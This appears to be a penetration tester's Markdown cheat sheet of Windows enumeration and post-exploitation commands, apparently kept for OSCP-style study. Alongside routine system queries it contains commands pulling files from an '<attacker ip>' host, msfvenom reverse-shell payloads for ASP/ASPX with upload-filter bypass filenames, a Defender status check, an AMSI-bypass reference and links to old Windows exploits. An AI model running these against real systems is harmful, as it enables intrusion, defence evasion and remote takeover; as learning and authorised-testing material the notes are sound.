OS architecture 

- powershell

```powershell
# https://docs.microsoft.com/en-us/dotnet/api/system.environment.is64bitoperatingsystem?view=net-6.0
[System.Environment]::Is64BitOperatingSystem
# without .Net
(gwmi Win32_OperatingSystem).OSArchitecture -eq '64-bit'
```

- cmd

```cmd
(wmic os get osarchitecture)
```

AppData's Temp folder (%TEMP%)

```cmd
C:\Users\<User Account>\AppData\Local\Temp
C:\Windows\Temp
```

[displays file ownership information](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir)

```cmd
dir /q /a
```

privileges information

```cmd
whoami /priv
whoami /all
whoami /groups
```

check network connections 

```cmd
netstat -ano | findstr LISTEN
```

file transfer

```cmd
# on target 
certutil -urlcache -split -f "http://<attacker ip>/<file>" "C:\Users\<User Account>\Desktop\<file>"
PowerShell -c "(new-object System.Net.WebClient).DownloadFile('http://<attacker ip>/<file>', '<file>')"
Powershell Invoke-WebRequest -OutFile C:\Users\<User Account>\Desktop\<file> -Uri http://<attacker ip>/<file>
```

checking if Windows Defender is active

```powershell
get-item 'hklm:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\'
```

ASP & ASPX reverse shell

```shell
# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f asp -o rev.asp
# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f aspx -o rev.aspx
# file upload bypass
#   try filename "rev.aspx..... .. . . ."
#   try filename "rev.aspx.png"
#   try web.config (File_Upload_Bypass.md)
```

get all drives

```powershell
# powershell
gdr -PSProvider 'FileSystem'
```

```cmd
REM cmd
wmic logicaldisk get deviceid, volumename, description
```

SMB

```shell
nmap -p 445 --script vuln <target ip>
```

Kali provides [Windows executables](https://www.kali.org/tools/windows-binaries/)

```shell
# /usr/share/windows-resources/binaries
find / -name whoami.exe 2>/dev/null
windows-binaries -h
```

UNZIP

```cmd
REM Windows 10 build 17063 or later
tar -xf <zip file>
```

Bypass AMSI Powershell (PEN-300)

https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

```
1. one liners to multiple lines
2. hex encoding
```

list firewall rules

```cmd
Netsh advfirewall firewall show rule dir=in name=all
```

Windows Updates

```cmd
wmic qfe
```

```powershell
Get-HotFix
```

Installed Programs

```cmd
wmic product get name, version, installlocation
```

copy file from net share folder

```powershell
Copy-Item -path "\\<target ip or hostname>\<folder($)>" -destination .\ -Recurse
```

check running services

```
Get-Service | where {$_.Status -eq "Running"}
```

find specific files

```cmd
REM command prompt
dir /s C:\Folder\*.txt
```

```powershell
# powershell
Get-ChildItem -Path "C:\Folder" -Recurse -Force -Filter "*.txt"
Get-ChildItem -Path "C:\Folder" -Recurse -Force -Include "*.txt","*.zip","*.conf"
```

[registry query](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg)

```cmd
reg query HKEY_LOCAL_MACHINE\Software /f Python
```

[Tasklist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist)

```
tasklist /v
```

Task Scheduler(taskschd.msc)

```
schtasks /query /fo LIST /v
```

Powershell [Get-ScheduledTask Script](https://github.com/tedchen0001/OSCP-Notes/blob/master/Write_Scripts/ScheduledTask.ps1)

convert to command line, replace `\r\n` to `empty string` and `"` to `\"`

```cmd
powershell -command "$ScheduledTasks = Get-ScheduledTask | Where-Object {$_.TaskPath -notlike \"\Microsoft*\" -and $_.TaskName -notlike \"*TEST*\"};foreach ($item in $ScheduledTasks) {    [string]$Name       = ($item.TaskName);    [string]$Action     = ($item.Actions | Select-Object -ExpandProperty Execute);    [datetime]$Start    = ($item.Triggers | Select-Object -ExpandProperty StartBoundary);    [string]$Repetition = ($item.Triggers.Repetition | Select-Object -ExpandProperty interval);    [string]$Duration   = ($item.Triggers.Repetition | Select-Object -ExpandProperty duration);    $splat = @{    'Name'       = $Name;    'Action'     = $Action;    'Start'      = $Start;    'Repetition' = $Repetition;    'Duration'   = $Duration;    };    $obj = New-Object -TypeName PSObject -property $splat;    $obj | Write-Output;};"
```

Powershell 2.0 (Windows 7 & Windows Server 2008 R2)

```powershell
schtasks /query /fo csv -v | ConvertFrom-Csv | ? {$_.TaskName -notlike "\Microsoft\Windows*" -and $_.TaskName -notlike "\Microsoft\Office\*" -and $_.TaskName -notlike "\Microsoft\XblGameSave\*" -and $_.TaskName -notlike "TaskName"}
```

Windows Library Files

```
https://wikileaks.org/ciav7p1/cms/page_13763381.html
https://blog.f-secure.com/abusing-windows-library-files-for-persistence/
```

#### Old Vulnerability

MS08_067 [tool 1](https://github.com/andyacer/ms08_067) [tool 2](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py)

```shell
# check os version
nmap -p <target ports> --script /usr/share/nmap/scripts/smb-os-discovery <target ip>
```

CVE-2019-0708

```
https://github.com/robertdavidgraham/rdpscan
```

CVE-2017-7269

Microsoft Windows Server 2003 IIS 6.0 WebDAV

```
https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
```

CVE-2014-6271

```
https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
```

#### Resources

```
https://ss64.com/
https://lolbas-project.github.io/#
```